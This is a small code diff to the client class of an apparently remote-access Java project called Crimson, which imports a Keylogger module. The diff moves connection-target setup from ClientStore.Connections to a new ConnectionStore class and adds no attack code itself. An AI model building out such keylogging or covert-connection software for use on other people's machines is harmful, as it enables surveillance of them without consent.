@@ -26,6 +26,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
@@ -83,8 +84,8 @@ public class Client {
 			}
 		}
 
-		ClientStore.Connections.setTargets(ic.getTargetList());
-		ClientStore.Connections.connectionRoutine();
+		ConnectionStore.setTargets(ic.getTargetList());
+		ConnectionStore.connectionRoutine();
 
 	}
 
